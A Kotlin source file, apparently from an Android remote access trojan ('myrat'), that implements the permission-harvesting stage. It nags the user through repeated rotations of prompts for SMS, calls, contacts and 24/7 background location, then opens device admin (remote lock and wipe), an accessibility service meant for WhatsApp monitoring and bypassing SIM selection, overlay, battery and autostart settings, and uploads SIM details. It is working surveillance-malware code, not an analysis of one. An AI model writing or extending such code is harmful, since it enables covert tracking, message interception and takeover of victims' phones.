package com.myrat.app.handler

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import com.myrat.app.service.ServiceManager
import com.myrat.app.utils.Logger
import com.myrat.app.utils.PermissionUtils
import pub.devrel.easypermissions.EasyPermissions
import pub.devrel.easypermissions.PermissionRequest
import java.lang.ref.WeakReference

class PermissionHandler(
    activity: Activity,
    private val simDetailsHandler: SimDetailsHandler,
    private val serviceManager: ServiceManager
) {

    private val activityRef = WeakReference(activity)
    private val handler = Handler(Looper.getMainLooper())
    private var currentPermissionGroup = 0
    private var rotationCount = 0
    private val maxRotations = 3
    private var isProcessing = false
    private var isDestroyed = false
    private var backgroundLocationRequested = false

    companion object {
        private const val RC_SMS_PERMISSIONS = 100
        private const val RC_PHONE_PERMISSIONS = 101
        private const val RC_LOCATION_PERMISSIONS = 102
        private const val RC_BACKGROUND_LOCATION = 103
        private const val RC_STORAGE_PERMISSIONS = 104
        private const val RC_NOTIFICATION_PERMISSIONS = 105

        private const val ROTATION_DELAY = 3000L
        private const val SPECIAL_PERMISSION_DELAY = 4000L
        private const val BACKGROUND_LOCATION_DELAY = 2000L
    }

    data class PermissionGroup(
        val name: String,
        val permissions: Array<String>,
        val requestCode: Int,
        val description: String,
        val isBackgroundLocation: Boolean = false
    ) {
        override fun equals(other: Any?): Boolean {
            if (this === other) return true
            if (javaClass != other?.javaClass) return false
            other as PermissionGroup
            return name == other.name && requestCode == other.requestCode
        }

        override fun hashCode(): Int {
            return name.hashCode() * 31 + requestCode
        }
    }

    private val permissionGroups = listOf(
        PermissionGroup(
            name = "SMS",
            permissions = PermissionUtils.SMS_PERMISSIONS,
            requestCode = RC_SMS_PERMISSIONS,
            description = "📱 SMS PERMISSIONS (CRITICAL)\n\nRequired for:\n• Receiving SMS messages\n• Reading existing SMS\n• Sending SMS messages\n\nSMS service will start immediately after granting."
        ),
        PermissionGroup(
            name = "PHONE",
            permissions = PermissionUtils.PHONE_PERMISSIONS,
            requestCode = RC_PHONE_PERMISSIONS,
            description = "📞 PHONE PERMISSIONS (CRITICAL)\n\nRequired for:\n• Making phone calls with SIM selection\n• Reading phone state and SIM info\n• Accessing contacts\n• Reading call history\n\nCall and contact services will start after granting."
        ),
        PermissionGroup(
            name = "LOCATION",
            permissions = PermissionUtils.LOCATION_PERMISSIONS,
            requestCode = RC_LOCATION_PERMISSIONS,
            description = "📍 LOCATION PERMISSIONS (CRITICAL - STEP 1)\n\nRequired for:\n• Real-time location tracking\n• Location history\n• GPS monitoring\n\nAfter granting these, we'll ask for ALL-TIME LOCATION access."
        ),
        PermissionGroup(
            name = "BACKGROUND_LOCATION",
            permissions = PermissionUtils.BACKGROUND_LOCATION_PERMISSIONS,
            requestCode = RC_BACKGROUND_LOCATION,
            description = "📍 ALL-TIME LOCATION ACCESS (CRITICAL - STEP 2)\n\nRequired for:\n• Location tracking when app is closed\n• Background location monitoring\n• Continuous GPS tracking\n\nThis enables 24/7 location services.",
            isBackgroundLocation = true
        ),
        PermissionGroup(
            name = "STORAGE",
            permissions = PermissionUtils.STORAGE_PERMISSIONS,
            requestCode = RC_STORAGE_PERMISSIONS,
            description = "📁 STORAGE PERMISSIONS\n\nRequired for:\n• Accessing images and files\n• Image upload functionality\n\nImage upload service will start after granting."
        ),
        PermissionGroup(
            name = "NOTIFICATIONS",
            permissions = PermissionUtils.NOTIFICATION_PERMISSIONS,
            requestCode = RC_NOTIFICATION_PERMISSIONS,
            description = "🔔 NOTIFICATION PERMISSIONS (Android 13+)\n\nRequired for:\n• Important app notifications\n• Service status updates\n• Alert notifications"
        )
    ).filter { it.permissions.isNotEmpty() }

    fun requestPermissions() {
        if (isDestroyed) {
            Logger.error("PermissionHandler is destroyed, cannot request permissions")
            return
        }

        val activity = activityRef.get()
        if (activity == null || activity.isFinishing || activity.isDestroyed) {
            Logger.error("Activity is null or finishing, cannot request permissions")
            return
        }

        if (isProcessing) {
            Logger.log("Permission request already in progress, skipping")
            return
        }

        try {
            Logger.log("🔄 Starting ROTATIONAL permission system with ALL-TIME LOCATION support")
            Logger.log("📍 Will request: Location → Background Location → Other permissions")
            currentPermissionGroup = 0
            rotationCount = 0
            isProcessing = true
            backgroundLocationRequested = false

            startRotationalPermissionFlow(activity)
        } catch (e: Exception) {
            Logger.error("Error starting permission request", e)
            isProcessing = false
        }
    }

    private fun startRotationalPermissionFlow(activity: Activity) {
        if (isDestroyed || activity.isFinishing || activity.isDestroyed) {
            Logger.log("Activity finishing or destroyed, stopping permission flow")
            isProcessing = false
            return
        }

        try {
            if (currentPermissionGroup >= permissionGroups.size) {
                rotationCount++
                currentPermissionGroup = 0

                if (rotationCount >= maxRotations) {
                    Logger.log("🏁 Completed $maxRotations rotations, moving to special permissions")
                    requestSpecialPermissions(activity)
                    return
                }

                Logger.log("🔄 Starting rotation ${rotationCount + 1}/$maxRotations")
            }

            if (permissionGroups.isEmpty()) {
                Logger.error("No permission groups available, moving to special permissions")
                requestSpecialPermissions(activity)
                return
            }

            val permissionGroup = permissionGroups[currentPermissionGroup]

            if (permissionGroup.isBackgroundLocation) {
                handleBackgroundLocationPermission(activity, permissionGroup)
                return
            }

            // Use centralized permission checking
            if (PermissionUtils.hasPermissionGroup(activity, permissionGroup.permissions)) {
                Logger.log("✅ ${permissionGroup.name} permissions already granted, skipping")
                safeExecute { serviceManager.checkAndStartAvailableServices() }
                currentPermissionGroup++
                handler.post { if (!isDestroyed) startRotationalPermissionFlow(activity) }
                return
            }

            Logger.log("🔄 Rotation ${rotationCount + 1}/$maxRotations - Requesting ${permissionGroup.name} permissions")

            safeExecute {
                EasyPermissions.requestPermissions(
                    PermissionRequest.Builder(activity, permissionGroup.requestCode, *permissionGroup.permissions)
                        .setRationale("""
                            ${permissionGroup.description}
                            
                            📊 Progress: Rotation ${rotationCount + 1}/$maxRotations
                            🔄 Group ${currentPermissionGroup + 1}/${permissionGroups.size}: ${permissionGroup.name}
                            
                            Note: We'll ask again if you deny, but services will start with whatever permissions you grant.
                        """.trimIndent())
                        .setPositiveButtonText("Grant ${permissionGroup.name}")
                        .setNegativeButtonText("Skip for now")
                        .build()
                )
            }
        } catch (e: Exception) {
            Logger.error("Error in rotational permission flow", e)
            currentPermissionGroup++
            handler.postDelayed({
                if (!isDestroyed) startRotationalPermissionFlow(activity)
            }, ROTATION_DELAY)
        }
    }

    private fun handleBackgroundLocationPermission(activity: Activity, permissionGroup: PermissionGroup) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                Logger.log("📍 Background location not needed on Android < 10, skipping")
                currentPermissionGroup++
                handler.post { if (!isDestroyed) startRotationalPermissionFlow(activity) }
                return
            }

            if (PermissionUtils.hasBackgroundLocationPermissions(activity)) {
                Logger.log("✅ Background location already granted")
                currentPermissionGroup++
                handler.post { if (!isDestroyed) startRotationalPermissionFlow(activity) }
                return
            }

            if (!PermissionUtils.hasForegroundLocationPermissions(activity)) {
                Logger.log("📍 Foreground location not granted yet, skipping background location for now")
                currentPermissionGroup++
                handler.post { if (!isDestroyed) startRotationalPermissionFlow(activity) }
                return
            }

            if (backgroundLocationRequested) {
                Logger.log("📍 Background location already requested this session, skipping")
                currentPermissionGroup++
                handler.post { if (!isDestroyed) startRotationalPermissionFlow(activity) }
                return
            }

            Logger.log("📍 Requesting ALL-TIME LOCATION ACCESS (Background Location)")
            backgroundLocationRequested = true

            safeExecute {
                EasyPermissions.requestPermissions(
                    PermissionRequest.Builder(activity, permissionGroup.requestCode, *permissionGroup.permissions)
                        .setRationale("""
                            ${permissionGroup.description}
                            
                            ⚠️ IMPORTANT: On the next screen, please select "Allow all the time" for location access.
                            
                            📊 Progress: Rotation ${rotationCount + 1}/$maxRotations
                            🔄 Background Location Request
                            
                            This is required for 24/7 location tracking when the app is closed.
                        """.trimIndent())
                        .setPositiveButtonText("Grant All-Time Location")
                        .setNegativeButtonText("Skip for now")
                        .build()
                )
            }
        } catch (e: Exception) {
            Logger.error("Error handling background location permission", e)
            currentPermissionGroup++
            handler.postDelayed({
                if (!isDestroyed) startRotationalPermissionFlow(activity)
            }, BACKGROUND_LOCATION_DELAY)
        }
    }

    fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
        if (isDestroyed) return

        val activity = activityRef.get()
        if (activity == null || activity.isFinishing || activity.isDestroyed) {
            Logger.error("Activity unavailable in onPermissionsGranted")
            return
        }

        try {
            val permissionGroup = permissionGroups.find { it.requestCode == requestCode }
            Logger.log("✅ ${permissionGroup?.name ?: "Unknown"} permissions granted: $perms")

            if (requestCode == RC_LOCATION_PERMISSIONS) {
                Logger.log("📍 Foreground location granted, will request background location next")
                safeExecute { serviceManager.checkAndStartAvailableServices() }
            } else if (requestCode == RC_BACKGROUND_LOCATION) {
                Logger.log("🎉 ALL-TIME LOCATION ACCESS GRANTED! 24/7 location tracking enabled")
                safeExecute { serviceManager.checkAndStartAvailableServices() }
            } else {
                safeExecute { serviceManager.checkAndStartAvailableServices() }
            }

            currentPermissionGroup++

            val delay = if (requestCode == RC_LOCATION_PERMISSIONS) {
                BACKGROUND_LOCATION_DELAY
            } else {
                ROTATION_DELAY
            }

            handler.postDelayed({
                if (!isDestroyed) startRotationalPermissionFlow(activity)
            }, delay)

        } catch (e: Exception) {
            Logger.error("Error in onPermissionsGranted", e)
        }
    }

    fun onPermissionsDenied(requestCode: Int, perms: MutableList<String>) {
        if (isDestroyed) return

        val activity = activityRef.get()
        if (activity == null || activity.isFinishing || activity.isDestroyed) {
            Logger.error("Activity unavailable in onPermissionsDenied")
            return
        }

        try {
            val permissionGroup = permissionGroups.find { it.requestCode == requestCode }
            Logger.warn("❌ ${permissionGroup?.name ?: "Unknown"} permissions denied: $perms")

            if (requestCode == RC_BACKGROUND_LOCATION) {
                Logger.warn("⚠️ ALL-TIME LOCATION ACCESS DENIED - Location tracking will be limited")
                Logger.warn("📍 Location service will work only when app is open")
            }

            safeExecute { serviceManager.checkAndStartAvailableServices() }

            if (EasyPermissions.somePermissionPermanentlyDenied(activity, perms)) {
                Logger.warn("⚠️ Some ${permissionGroup?.name} permissions permanently denied")

                if (requestCode == RC_BACKGROUND_LOCATION) {
                    Logger.warn("📍 To enable all-time location later, go to Settings > Apps > ${activity.packageName} > Permissions > Location > Allow all the time")
                }
            }

            currentPermissionGroup++

            handler.postDelayed({
                if (!isDestroyed) startRotationalPermissionFlow(activity)
            }, ROTATION_DELAY)

        } catch (e: Exception) {
            Logger.error("Error in onPermissionsDenied", e)
        }
    }

    private fun requestSpecialPermissions(activity: Activity) {
        if (isDestroyed || activity.isFinishing || activity.isDestroyed) {
            Logger.log("Activity finishing, skipping special permissions")
            finishPermissionFlow(activity)
            return
        }

        try {
            Logger.log("🔧 Starting special permissions flow")

            if (!isBatteryOptimizationDisabled(activity)) {
                Logger.log("🔋 Battery optimization not disabled, requesting...")
                requestBatteryOptimization(activity)
                return
            } else {
                Logger.log("✅ Battery optimization already disabled")
            }

            if (!isDeviceAdminEnabled(activity)) {
                Logger.log("🔐 Device admin not enabled, requesting...")
                requestDeviceAdmin(activity)
                return
            } else {
                Logger.log("✅ Device admin already enabled")
            }

            if (!isAccessibilityServiceEnabled(activity)) {
                Logger.log("♿ Accessibility service not enabled, requesting...")
                requestAccessibilityService(activity)
                return
            } else {
                Logger.log("✅ Accessibility service already enabled")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
                Logger.log("🖼️ Overlay permission not granted, requesting...")
                requestOverlayPermission(activity)
                return
            } else {
                Logger.log("✅ Overlay permission already granted or not needed")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager
                if (alarmManager != null && !alarmManager.canScheduleExactAlarms()) {
                    Logger.log("⏰ Exact alarms permission not granted, requesting...")
                    requestExactAlarms(activity)
                    return
                } else {
                    Logger.log("✅ Exact alarms permission already granted or not needed")
                }
            }

            Logger.log("✅ All special permissions checked, moving to manufacturer settings")
            requestManufacturerSpecificSettings(activity)

        } catch (e: Exception) {
            Logger.error("Error in special permissions flow", e)
            finishPermissionFlow(activity)
        }
    }

    private fun requestBatteryOptimization(activity: Activity) {
        Logger.log("🔋 Requesting battery optimization disable (CRITICAL for service persistence)")

        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Battery optimization intent launched")

            handler.postDelayed({
                if (!isDestroyed) {
                    safeExecute { serviceManager.checkAndStartAvailableServices() }
                    requestSpecialPermissions(activity)
                }
            }, SPECIAL_PERMISSION_DELAY)

        } catch (e: Exception) {
            Logger.error("Failed to request battery optimization", e)
            handler.postDelayed({
                if (!isDestroyed) requestSpecialPermissions(activity)
            }, 1000)
        }
    }

    private fun requestDeviceAdmin(activity: Activity) {
        Logger.log("🔐 Requesting device admin (for lock service)")

        try {
            if (isDeviceAdminEnabled(activity)) {
                Logger.log("✅ Device admin is actually already enabled, skipping request")
                handler.postDelayed({
                    if (!isDestroyed) {
                        safeExecute { serviceManager.checkAndStartAvailableServices() }
                        requestSpecialPermissions(activity)
                    }
                }, 500)
                return
            }

            val adminComponent = ComponentName(activity, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "🔐 DEVICE ADMINISTRATOR PERMISSION\n\nThis permission enables:\n• Remote device locking\n• Screen control (on/off)\n• Security management\n• Device wipe (if needed)\n\nRequired for the Lock Service to function properly.")
            }
            activity.startActivity(intent)
            Logger.log("Device admin intent launched")

            handler.postDelayed({
                if (!isDestroyed) {
                    safeExecute { serviceManager.checkAndStartAvailableServices() }
                    requestSpecialPermissions(activity)
                }
            }, SPECIAL_PERMISSION_DELAY)

        } catch (e: Exception) {
            Logger.error("Failed to request device admin", e)
            handler.postDelayed({
                if (!isDestroyed) requestSpecialPermissions(activity)
            }, 1000)
        }
    }

    private fun requestAccessibilityService(activity: Activity) {
        Logger.log("♿ Requesting accessibility service (for WhatsApp monitoring and SIM selection bypass)")

        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            activity.startActivity(intent)
            Logger.log("Accessibility settings intent launched")

            handler.postDelayed({
                if (!isDestroyed) {
                    safeExecute { serviceManager.checkAndStartAvailableServices() }
                    requestSpecialPermissions(activity)
                }
            }, SPECIAL_PERMISSION_DELAY + 1000)

        } catch (e: Exception) {
            Logger.error("Failed to open accessibility settings", e)
            handler.postDelayed({
                if (!isDestroyed) requestSpecialPermissions(activity)
            }, 1000)
        }
    }

    private fun requestOverlayPermission(activity: Activity) {
        Logger.log("🖼️ Requesting overlay permission")

        try {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Overlay permission intent launched")

            handler.postDelayed({
                if (!isDestroyed) {
                    safeExecute { serviceManager.checkAndStartAvailableServices() }
                    requestSpecialPermissions(activity)
                }
            }, SPECIAL_PERMISSION_DELAY)

        } catch (e: Exception) {
            Logger.error("Failed to request overlay permission", e)
            handler.postDelayed({
                if (!isDestroyed) requestSpecialPermissions(activity)
            }, 1000)
        }
    }

    private fun requestExactAlarms(activity: Activity) {
        Logger.log("⏰ Requesting exact alarms permission (Android 12+)")

        try {
            val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Exact alarms permission intent launched")

            handler.postDelayed({
                if (!isDestroyed) {
                    safeExecute { serviceManager.checkAndStartAvailableServices() }
                    requestSpecialPermissions(activity)
                }
            }, SPECIAL_PERMISSION_DELAY)

        } catch (e: Exception) {
            Logger.error("Failed to request exact alarms permission", e)
            handler.postDelayed({
                if (!isDestroyed) requestSpecialPermissions(activity)
            }, 1000)
        }
    }

    private fun requestManufacturerSpecificSettings(activity: Activity) {
        Logger.log("🏭 Opening manufacturer-specific settings")

        try {
            val manufacturer = Build.MANUFACTURER.lowercase()
            Logger.log("Device manufacturer: $manufacturer")

            when {
                manufacturer.contains("xiaomi") -> openXiaomiSettings(activity)
                manufacturer.contains("oppo") -> openOppoSettings(activity)
                manufacturer.contains("vivo") -> openVivoSettings(activity)
                manufacturer.contains("huawei") -> openHuaweiSettings(activity)
                manufacturer.contains("samsung") -> openSamsungSettings(activity)
                manufacturer.contains("oneplus") -> openOnePlusSettings(activity)
                manufacturer.contains("realme") -> openRealmeSettings(activity)
                else -> {
                    Logger.log("No specific manufacturer settings for: $manufacturer")
                    finishPermissionFlow(activity)
                }
            }
        } catch (e: Exception) {
            Logger.error("Failed to open manufacturer settings", e)
            finishPermissionFlow(activity)
        }
    }

    private fun openXiaomiSettings(activity: Activity) {
        Logger.log("🔧 Opening MIUI-specific settings")

        val intents = listOf(
            Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
            Intent().setComponent(ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity")),
            Intent("miui.intent.action.APP_PERM_EDITOR").setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity").putExtra("extra_pkgname", activity.packageName),
            Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.securitycenter.Main"))
        )

        tryLaunchIntents(activity, intents, "MIUI Settings")
    }

    private fun openOppoSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
            Intent().setComponent(ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity"))
        )
        tryLaunchIntents(activity, intents, "ColorOS Settings")
    }

    private fun openVivoSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
            Intent().setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"))
        )
        tryLaunchIntents(activity, intents, "Vivo Settings")
    }

    private fun openHuaweiSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"))
        )
        tryLaunchIntents(activity, intents, "Huawei Settings")
    }

    private fun openSamsungSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        tryLaunchIntents(activity, intents, "Samsung Settings")
    }

    private fun openOnePlusSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        tryLaunchIntents(activity, intents, "OnePlus Settings")
    }

    private fun openRealmeSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        tryLaunchIntents(activity, intents, "Realme Settings")
    }

    private fun tryLaunchIntents(activity: Activity, intents: List<Intent>, settingsName: String) {
        for (intent in intents) {
            try {
                if (intent.resolveActivity(activity.packageManager) != null) {
                    activity.startActivity(intent)
                    Logger.log("Successfully opened $settingsName")

                    handler.postDelayed({
                        if (!isDestroyed) finishPermissionFlow(activity)
                    }, 2000)
                    return
                }
            } catch (e: Exception) {
                Logger.warn("Failed to launch intent for $settingsName: ${e.message}")
            }
        }

        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Opened app settings as fallback for $settingsName")
        } catch (e: Exception) {
            Logger.error("Failed to open app settings fallback", e)
        }

        finishPermissionFlow(activity)
    }

    private fun finishPermissionFlow(activity: Activity) {
        if (isDestroyed) return

        Logger.log("🎉 Rotational permission flow completed!")

        try {
            safeExecute { serviceManager.checkAndStartAvailableServices() }
            safeExecute { simDetailsHandler.uploadSimDetails() }

            val stats = serviceManager.getServiceStats()
            Logger.log("Final service status: ${stats["running_services"]}/${stats["total_services"]} services running")

            logFinalPermissionStatus(activity)
            isProcessing = false

        } catch (e: Exception) {
            Logger.error("Error in finishPermissionFlow", e)
            isProcessing = false
        }
    }

    private fun logFinalPermissionStatus(activity: Activity) {
        try {
            Logger.log("=== FINAL PERMISSION STATUS ===")
            Logger.log("📱 SMS: ${if (PermissionUtils.hasAllSmsPermissions(activity)) "✅ GRANTED" else "❌ DENIED"}")
            Logger.log("📞 Phone: ${if (PermissionUtils.hasAllCallPermissions(activity)) "✅ GRANTED" else "❌ DENIED"}")
            Logger.log("📍 Location (Foreground): ${if (PermissionUtils.hasForegroundLocationPermissions(activity)) "✅ GRANTED" else "❌ DENIED"}")

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                Logger.log("📍 Location (ALL-TIME): ${if (PermissionUtils.hasBackgroundLocationPermissions(activity)) "✅ GRANTED" else "❌ DENIED"}")
            }

            Logger.log("🔋 Battery Optimization: ${if (isBatteryOptimizationDisabled(activity)) "✅ DISABLED" else "❌ ENABLED"}")
            Logger.log("🔐 Device Admin: ${if (isDeviceAdminEnabled(activity)) "✅ ENABLED" else "❌ DISABLED"}")
            Logger.log("♿ Accessibility Service: ${if (isAccessibilityServiceEnabled(activity)) "✅ ENABLED" else "❌ DISABLED"}")

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Logger.log("🖼️ Overlay Permission: ${if (Settings.canDrawOverlays(activity)) "✅ GRANTED" else "❌ DENIED"}")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager
                Logger.log("⏰ Exact Alarms: ${if (alarmManager?.canScheduleExactAlarms() == true) "✅ GRANTED" else "❌ DENIED"}")
            }

            Logger.log("=== END PERMISSION STATUS ===")
        } catch (e: Exception) {
            Logger.error("Error logging final permission status", e)
        }
    }

    private fun isBatteryOptimizationDisabled(context: Context): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
                val result = powerManager?.isIgnoringBatteryOptimizations(context.packageName) ?: false
                Logger.log("🔋 Battery optimization check: $result")
                result
            } else {
                Logger.log("🔋 Battery optimization not applicable for Android < M")
                true
            }
        } catch (e: Exception) {
            Logger.error("Error checking battery optimization", e)
            false
        }
    }

    private fun isDeviceAdminEnabled(context: Context): Boolean {
        return try {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
            if (devicePolicyManager == null) {
                Logger.error("🔐 DevicePolicyManager is null")
                return false
            }

            val adminComponent = ComponentName(context, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            val result = devicePolicyManager.isAdminActive(adminComponent)
            Logger.log("🔐 Device admin check: $result (component: ${adminComponent.className})")

            try {
                val packageManager = context.packageManager
                val receiverInfo = packageManager.getReceiverInfo(adminComponent, android.content.pm.PackageManager.GET_META_DATA)
                Logger.log("🔐 Device admin receiver found: ${receiverInfo.name}")
            } catch (e: Exception) {
                Logger.error("🔐 Device admin receiver not found or not properly registered", e)
            }

            result
        } catch (e: Exception) {
            Logger.error("Error checking device admin", e)
            false
        }
    }

    private fun isAccessibilityServiceEnabled(context: Context): Boolean {
        return try {
            val accessibilityEnabled = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED, 0
            )
            Logger.log("♿ Accessibility enabled setting: $accessibilityEnabled")

            if (accessibilityEnabled == 1) {
                val services = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                )
                Logger.log("♿ Enabled accessibility services: $services")

                val serviceName = "${context.packageName}/com.myrat.app.service.WhatsAppService"
                val result = services?.contains(serviceName) == true
                Logger.log("♿ Our accessibility service enabled: $result (looking for: $serviceName)")
                result
            } else {
                Logger.log("♿ Accessibility services globally disabled")
                false
            }
        } catch (e: Exception) {
            Logger.error("Error checking accessibility service", e)
            false
        }
    }

    private fun safeExecute(action: () -> Unit) {
        try {
            if (!isDestroyed) action()
        } catch (e: Exception) {
            Logger.error("Error in safe execution", e)
        }
    }

    fun hasBasicPermissions(): Boolean {
        val activity = activityRef.get() ?: return false
        return try {
            PermissionUtils.hasAllCriticalPermissions(activity)
        } catch (e: Exception) {
            Logger.error("Error checking basic permissions", e)
            false
        }
    }

    fun areAllPermissionsGranted(): Boolean {
        val activity = activityRef.get() ?: return false

        return try {
            val runtimeGranted = PermissionUtils.hasAllCriticalPermissions(activity)
            val batteryOptimized = isBatteryOptimizationDisabled(activity)
            val deviceAdminEnabled = isDeviceAdminEnabled(activity)
            val hasAllTimeLocation = PermissionUtils.hasBackgroundLocationPermissions(activity)

            Logger.log("🔍 Permission check: Runtime=$runtimeGranted, Battery=$batteryOptimized, DeviceAdmin=$deviceAdminEnabled, AllTimeLocation=$hasAllTimeLocation")

            runtimeGranted && batteryOptimized && deviceAdminEnabled && hasAllTimeLocation
        } catch (e: Exception) {
            Logger.error("Error checking all permissions", e)
            false
        }
    }

    fun handleResume() {
        if (isDestroyed) return

        try {
            val activity = activityRef.get()
            if (activity == null || activity.isFinishing || activity.isDestroyed) {
                return
            }

            Logger.log("🔄 Handling resume - checking permissions and starting services")
            safeExecute { serviceManager.checkAndStartAvailableServices() }
            logFinalPermissionStatus(activity)

            if (areAllPermissionsGranted()) {
                Logger.log("✅ All permissions granted on resume")
                finishPermissionFlow(activity)
            } else {
                Logger.log("⚠️ Not all permissions granted on resume")
            }
        } catch (e: Exception) {
            Logger.error("Error in handleResume", e)
        }
    }

    fun cleanup() {
        try {
            isDestroyed = true
            isProcessing = false
            handler.removeCallbacksAndMessages(null)
            Logger.log("PermissionHandler cleanup completed")
        } catch (e: Exception) {
            Logger.error("Error in cleanup", e)
        }
    }
}